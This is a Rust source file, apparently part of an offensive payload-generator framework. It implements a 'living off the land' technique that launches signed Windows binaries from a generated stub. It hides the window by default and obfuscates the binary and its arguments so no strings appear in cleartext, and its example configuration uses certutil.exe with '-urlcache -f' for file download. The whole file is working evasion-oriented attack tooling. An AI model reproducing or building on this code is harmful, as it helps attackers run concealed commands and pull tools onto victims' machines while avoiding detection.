//! Living off the land (control technique).
//!
//! Launches a process — a signed Microsoft binary (a LOLBin), or any command —
//! from the generated stub. A Control technique: it does not touch the payload,
//! it only orchestrates the chain. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::WindowMode;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the living-off-the-land technique.
///
/// The fragment is the `exec` stage launcher generalized into a technique; the
/// `exec` stage keeps its own copy of the same code, so the two must stay in
/// step (see `engine::stages::render_exec_fragment`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Process to launch. A bare name (no path separator) is resolved against
    /// `System32` at run time; a path is used as is.
    pub binary: String,
    /// Arguments passed to `binary`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub args: Vec<String>,
    /// Window visibility (default: hidden).
    #[serde(default)]
    pub window: WindowMode,
    /// Wait for the child and capture its exit code (default: true).
    #[serde(default = "default_wait")]
    pub wait: bool,
    /// Seconds to wait before terminating the child (0 = no limit).
    #[serde(default)]
    pub timeout_s: u64,
}

/// Default for [`Params::wait`]: wait for the child.
pub fn default_wait() -> bool {
    true
}

impl Default for Params {
    fn default() -> Self {
        Self {
            binary: String::new(),
            args: vec![],
            window: WindowMode::default(),
            wait: true,
            timeout_s: 0,
        }
    }
}

/// Static metadata for the living-off-the-land technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "living_off_the_land",
    attck: &["T1218", "T1105"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/living_off_the_land/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: living_off_the_land\nparams:\n  binary: certutil.exe\n  args: [\"-urlcache\", \"-f\"]\n",
    // The launcher is Win32 (`CreateProcessA`); routing it through the syscall
    // layer is out of scope (a new process is an entry point, not a kernel call
    // the stub issues).
    syscalls: &[],
    resolves_imports: false,
};

impl Params {
    /// Renders the launcher fragment for these parameters.
    ///
    /// The binary and every argument are emitted as code that rebuilds the
    /// string at run time through `strings`, so none of them lands in cleartext
    /// in the generated stub. `$FLAGS$`, `$WAIT$` and `$TIMEOUT_MS$` are plain
    /// compile-time values.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let binary = strings
            .obfuscate(&self.binary)
            .render_stub_expr("exec_binary");
        let args_def = if self.args.is_empty() {
            "vec![]".to_string()
        } else {
            let mut body = String::from("vec![\n");
            for (index, arg) in self.args.iter().enumerate() {
                let expr = strings
                    .obfuscate(arg)
                    .render_stub_expr(&format!("exec_arg_{index}"));
                body.push_str(&format!("            {expr},\n"));
            }
            body.push_str("        ]");
            body
        };
        let flags = match self.window {
            WindowMode::Hidden => "CREATE_NO_WINDOW",
            WindowMode::Normal => "PROCESS_CREATION_FLAGS(0)",
        };
        let timeout_ms = self.timeout_s.saturating_mul(1000).min(u32::MAX as u64);

        DEF.stub_fragment
            .replace("$BINARY_DEF$", &binary)
            .replace("$ARGS_DEF$", &args_def)
            .replace("$FLAGS$", flags)
            .replace("$WAIT$", if self.wait { "true" } else { "false" })
            .replace("$TIMEOUT_MS$", &format!("{timeout_ms}u32"))
    }
}

#[cfg(test)]
mod tests;
